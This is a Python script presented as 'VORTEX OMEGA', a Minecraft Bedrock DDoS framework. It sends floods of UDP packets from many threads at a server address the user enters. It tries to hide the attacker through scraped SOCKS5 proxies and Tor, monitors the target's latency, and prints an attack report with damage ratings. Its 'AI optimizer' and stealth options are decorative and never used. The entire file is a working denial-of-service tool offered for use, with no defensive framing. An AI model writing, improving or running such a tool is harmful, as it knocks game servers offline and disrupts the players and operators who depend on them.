#!/usr/bin/env python3
from mcstatus import BedrockServer
import socket
import threading
import time
import os
import pyfiglet
import socks
import random
import struct
import requests

class AttackVectors:
    @staticmethod
    def create_ping_flood_packet():
        payload = random.randbytes(random.randint(50, 500))
        return b'\x01' + struct.pack('>H', len(payload)) + payload

    @staticmethod
    def create_connection_flood_packet():
        return b'\x09' + os.urandom(16) + struct.pack('>Q', int(time.time()))

    @staticmethod
    def create_malformed_motd():
        return b'\x02' + b'A' * 1000

    @staticmethod
    def create_chunk_overflow():
        return b'\x03' + b'\xff' * 65535

class AIOptimizer:
    def __init__(self):
        self.attack_history = []
        
    def analyze_server_response(self, baseline_latency, current_latency, packet_count, attack_type):
        if not self.attack_history:
            return "aggressive"
            
        total_effectiveness = sum(h['effectiveness'] for h in self.attack_history)
        avg_effectiveness = total_effectiveness / len(self.attack_history)
        
        if avg_effectiveness > 80:
            return "aggressive"
        elif avg_effectiveness > 50:
            return "moderate"
        else:
            return "conservative"
    
    def optimize_attack_parameters(self, server_info, current_effectiveness):
        optimal_params = {
            'threads': 100,
            'delay': 0.01,
            'vector': 'ping_flood'
        }
        
        if server_info.get('players_online', 0) > 20:
            optimal_params['threads'] = 200
            optimal_params['delay'] = 0.005
        elif server_info.get('players_online', 0) < 5:
            optimal_params['threads'] = 50
            optimal_params['delay'] = 0.02
            
        if current_effectiveness < 30:
            optimal_params['threads'] *= 2
            optimal_params['delay'] /= 2
            
        return optimal_params

class StealthEngine:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Minecraft/1.19.0 (Windows; U; Windows NT 10.0; en-US)',
            'MCPE/UDP Client',
            'XboxLiveClient/2.0.0'
        ]
        self.proxy_list = self.load_proxy_list()
        
    def load_proxy_list(self):
        try:
            response = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all', timeout=10)
            return response.text.split('\r\n')
        except:
            return []
    
    def rotate_user_agent(self):
        return random.choice(self.user_agents)
    
    def get_random_proxy(self):
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            return proxy.split(':') if ':' in proxy else (proxy, 1080)
        return None

class AdvancedMonitoring:
    def __init__(self):
        self.metrics = {
            'packets_sent': 0,
            'successful_hits': 0,
            'failed_attempts': 0,
            'latency_spikes': [],
            'server_crashes': 0
        }
        self.lock = threading.Lock()
    
    def log_metric(self, metric, value=1):
        with self.lock:
            if metric in self.metrics:
                self.metrics[metric] += value
            else:
                self.metrics[metric] = value
    
    def get_real_time_analytics(self):
        return self.metrics.copy()

attack_vectors = AttackVectors()
ai_optimizer = AIOptimizer()
stealth_engine = StealthEngine()
monitor = AdvancedMonitoring()

PING_PACKETS = [
    attack_vectors.create_ping_flood_packet(),
    attack_vectors.create_connection_flood_packet(),
    attack_vectors.create_malformed_motd(),
    attack_vectors.create_chunk_overflow()
]

def check_tor_proxy():
    try:
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        response = requests.get("http://httpbin.org/ip", timeout=10)
        tor_ip = response.json()['origin']
        
        socks.set_default_proxy()
        socket.socket = socket.socket
        
        return True, tor_ip
    except:
        return False, None

def get_proxy_info():
    proxy_info = {
        'tor_available': False,
        'tor_ip': None,
        'public_ip': None,
        'proxy_services': []
    }
    
    try:
        tor_running, tor_ip = check_tor_proxy()
        proxy_info['tor_available'] = tor_running
        proxy_info['tor_ip'] = tor_ip
    except:
        pass
    
    try:
        response = requests.get("http://httpbin.org/ip", timeout=5)
        proxy_info['public_ip'] = response.json()['origin']
    except:
        proxy_info['public_ip'] = "Unable to determine"
    
    proxy_ports = [9050, 9150, 1080, 8080, 3128]
    for port in proxy_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            if result == 0:
                proxy_info['proxy_services'].append(f"Port {port} (Active)")
        except:
            pass
    
    return proxy_info

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_advanced_server_info(ip, port):
    try:
        server = BedrockServer.lookup(f"{ip}:{port}")
        status = server.status()
        
        info = {
            'online': True,
            'players_online': status.players.online,
            'players_max': status.players.max,
            'motd': status.motd.raw,
            'version': status.version.name,
            'protocol': status.version.protocol,
            'latency': status.latency,
            'map': getattr(status, 'map', 'Unknown'),
            'gamemode': getattr(status, 'gamemode', 'Unknown')
        }
        
        if status.players.online > 50:
            info['vulnerability'] = 'HIGH'
        elif 'craftbukkit' in status.version.name.lower():
            info['vulnerability'] = 'MEDIUM'
        else:
            info['vulnerability'] = 'UNKNOWN'
            
        return info
    except Exception as e:
        return {'online': False, 'error': str(e)}

def create_distributed_attack(ip, port, threads, duration, attack_type="mixed"):
    
    def advanced_attack_worker(worker_id):
        nonlocal packets_sent
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                current_vector = random.choice(PING_PACKETS)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                for _ in range(random.randint(1, 10)):
                    sock.sendto(current_vector, (ip, port))
                    with threading.Lock():
                        packets_sent += 1
                    monitor.log_metric('packets_sent')
                    
                    time.sleep(random.uniform(0.001, 0.1))
                    
                sock.close()
                
            except Exception as e:
                monitor.log_metric('failed_attempts')
                continue
    
    packets_sent = 0
    worker_threads = []
    
    for i in range(threads):
        thread = threading.Thread(target=advanced_attack_worker, args=(i,))
        thread.daemon = True
        thread.start()
        worker_threads.append(thread)
    
    return worker_threads, packets_sent

def real_time_impact_analysis(ip, port, duration):
    start_time = time.time()
    baseline_info = get_advanced_server_info(ip, port)
    max_latency = baseline_info.get('latency', 0)
    impact_events = 0
    
    print(f"\n\033[95m🎯 REAL-TIME IMPACT MONITORING\033[0m")
    print(f"📊 Baseline: {max_latency:.2f}ms | Players: {baseline_info.get('players_online', 0)}")
    
    while time.time() - start_time < duration:
        try:
            current_info = get_advanced_server_info(ip, port)
            if current_info['online']:
                current_latency = current_info.get('latency', 0)
                
                if current_latency > max_latency:
                    max_latency = current_latency
                    impact_events += 1
                
                if current_latency > baseline_info.get('latency', 0) * 3:
                    monitor.log_metric('latency_spikes')
                
                analytics = monitor.get_real_time_analytics()
                effectiveness = min((max_latency / baseline_info.get('latency', 1)) * 100, 1000)
                
                print(f"\r\033[94m📡 Live: {current_latency:.0f}ms | Peak: {max_latency:.0f}ms | Packets: {analytics['packets_sent']} | Eff: {effectiveness:.1f}%\033[0m", end='')
                
            time.sleep(2)
        except:
            monitor.log_metric('server_crashes')
            print(f"\r\033[91m🚨 SERVER POTENTIALLY CRASHING\033[0m", end='')
    
    return max_latency, impact_events

def generate_attack_report(ip, port, baseline_info, attack_params, results):
    clear_screen()
    
    report_banner = pyfiglet.figlet_format("ATTACK REPORT", font="small")
    print(f"\033[91m{report_banner}\033[0m")
    
    print("="*60)
    print("📊 VORTEX OMEGA - DDOS ANALYSIS REPORT")
    print("="*60)
    
    print(f"\n🎯 TARGET ANALYSIS")
    print(f"   IP: {ip}:{port}")
    print(f"   MOTD: {baseline_info.get('motd', 'Unknown')}")
    print(f"   Players: {baseline_info.get('players_online', 0)}/{baseline_info.get('players_max', 0)}")
    print(f"   Version: {baseline_info.get('version', 'Unknown')}")
    
    analytics = monitor.get_real_time_analytics()
    print(f"\n💥 ATTACK STATISTICS")
    print(f"   Duration: {attack_params['duration']} seconds")
    print(f"   Threads: {attack_params['threads']}")
    print(f"   Total Packets: {analytics['packets_sent']}")
    print(f"   Packets/Second: {analytics['packets_sent'] / attack_params['duration']:.1f}")
    
    latency_increase = ((results['max_latency'] - baseline_info['latency']) / baseline_info['latency']) * 100
    effectiveness = min(latency_increase / 10, 100)
    
    print(f"\n📈 IMPACT ANALYSIS")
    print(f"   Baseline Latency: {baseline_info['latency']:.2f} ms")
    print(f"   Peak Latency: {results['max_latency']:.2f} ms")
    print(f"   Latency Increase: {latency_increase:.1f}%")
    print(f"   Impact Events: {results['impact_events']}")
    
    if latency_increase > 1000:
        rating = "💀 CATASTROPHIC"
        color = "\033[91m"
    elif latency_increase > 500:
        rating = "🔥 DEVASTATING"
        color = "\033[91m"
    elif latency_increase > 200:
        rating = "⚠️  HIGH IMPACT"
        color = "\033[93m"
    elif latency_increase > 100:
        rating = "📈 MODERATE IMPACT"
        color = "\033[92m"
    else:
        rating = "💤 MINIMAL IMPACT"
        color = "\033[94m"
    
    print(f"{color}   Attack Effectiveness: {rating} ({effectiveness:.1f}%)\033[0m")
    
    print(f"\n🤖 AI RECOMMENDATIONS")
    if effectiveness < 50:
        print("   💡 Increase thread count")
        print("   💡 Use mixed attack vectors")
        print("   💡 Longer attack duration")
    else:
        print("   ✅ Current parameters effective")
    
    print("\n" + "="*60)

def main():
    while True:
        clear_screen()
        
        print("\033[91m")
        banner = pyfiglet.figlet_format("VORTEX OMEGA", font="slant")
        print(banner)
        print("\033[0m")
        
        print("\033[94m         ADVANCED MINECRAFT BEDROCK DDOS FRAMEWORK\033[0m")
        print("\033[93m              AI-POWERED • MULTI-VECTOR • STEALTH\033[0m")
        print("\n")
        
        print("\033[95m🌐 NETWORK STATUS CHECK:\033[0m")
        proxy_info = get_proxy_info()
        
        if proxy_info['tor_available']:
            print(f"🔐 \033[92mTOR PROXY: ACTIVE\033[0m")
            print(f"   📍 Tor Exit Node IP: {proxy_info['tor_ip']}")
            print(f"   🌍 Your Real IP: {proxy_info['public_ip']}")
        else:
            print(f"🔓 \033[91mTOR PROXY: INACTIVE\033[0m")
            print(f"   🌍 Your Public IP: {proxy_info['public_ip']}")
        
        if proxy_info['proxy_services']:
            print(f"🛡️  Active Proxy Services: {', '.join(proxy_info['proxy_services'])}")
        
        print("\033[95mCreator: S-K1DD13 | Enhanced by AI\033[0m")
        print("\033[96mVersion: 2.0 | Codename: BLACKOUT\033[0m")
        print("\n" + "="*50 + "\n")
        
        ip = input("\033[92m🎯 Target Server IP: \033[0m").strip()
        if not ip:
            continue
            
        port = input("\033[93m🔌 Target Port [19132]: \033[0m")
        port = int(port) if port else 19132
        
        print(f"\n\033[94m🕵️  Scanning {ip}:{port}...\033[0m")
        
        try:
            server_info = get_advanced_server_info(ip, port)
            
            if not server_info['online']:
                print(f"❌ \033[91mServer offline: {server_info.get('error', 'Unknown')}\033[0m")
                time.sleep(2)
                continue
                
            print(f"✅ \033[92mSERVER ONLINE\033[0m")
            print(f"📡 Latency: {server_info['latency']:.2f} ms")
            print(f"👥 Players: {server_info['players_online']}/{server_info['players_max']}")
            print(f"🎮 MOTD: {server_info['motd']}")
            print(f"🔧 Version: {server_info['version']}")
            print(f"⚠️  Vulnerability: {server_info['vulnerability']}")
            
        except Exception as e:
            print(f"❌ \033[91mScan failed: {str(e)}\033[0m")
            time.sleep(2)
            continue
        
        print("\n\033[95m⚙️  ATTACK CONFIGURATION\033[0m")
        
        threads = input("\033[92m🤖 Attack Threads [100-1000]: \033[0m")
        threads = int(threads) if threads else 200
        
        duration = input("\033[91m⏱️  Attack Duration (seconds) [30-600]: \033[0m")
        duration = int(duration) if duration else 60
        
        attack_mode = input("\033[93m🎯 Attack Mode [mixed/ping/connection/malformed]: \033[0m").lower()
        if not attack_mode:
            attack_mode = "mixed"
        
        print("\n\033[94m🎭 STEALTH OPTIONS\033[0m")
        use_stealth = input("Enable stealth mode? (y/n): ").lower() == 'y'
        
        if use_stealth:
            print("✅ \033[92mStealth mode activated\033[0m")
        
        print(f"\n\033[91m🚀 FINAL ATTACK PARAMETERS:\033[0m")
        print(f"🎯 Target: {ip}:{port}")
        print(f"💥 Threads: {threads} | Duration: {duration}s")
        print(f"🔧 Mode: {attack_mode.upper()} | Stealth: {'ON' if use_stealth else 'OFF'}")
        
        confirm = input("\n\033[91m🚨 CONFIRM ATTACK LAUNCH? (y/n): \033[0m").lower()
        if confirm != 'y':
            continue
        
        print(f"\n\033[91m💀 STARTING ATTACK...\033[0m")
        
        for i in range(3, 0, -1):
            print(f"\033[91m🚀 LAUNCH IN {i}...\033[0m")
            time.sleep(1)
        
        print(f"\033[91m🎯 ATTACK LAUNCHED!\033[0m\n")
        
        attack_params = {
            'threads': threads,
            'duration': duration,
            'mode': attack_mode
        }
        
        attack_threads, _ = create_distributed_attack(ip, port, threads, duration, attack_mode)
        max_latency, impact_events = real_time_impact_analysis(ip, port, duration)
        
        for thread in attack_threads:
            thread.join()
        
        results = {
            'max_latency': max_latency,
            'impact_events': impact_events
        }
        
        generate_attack_report(ip, port, server_info, attack_params, results)
        
        print("\n\033[94m🔄 OPERATION COMPLETE\033[0m")
        print("1. 🎯 New attack")
        print("2. 🔄 Continue attack")
        print("3. 🚪 Exit")
        
        choice = input("\n\033[96mSelect option (1-3): \033[0m").strip()
        
        if choice == '3':
            print("\n\033[91m👋 SHUTTING DOWN...\033[0m")
            break
        elif choice == '2':
            print("\n\033[92m🔄 CONTINUING ATTACK...\033[0m")
            continue

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m\n🚨 FORCEFULLY TERMINATED\033[0m")
    except Exception as e:
        print(f"\n\033[91m💀 ERROR: {e}\033[0m")
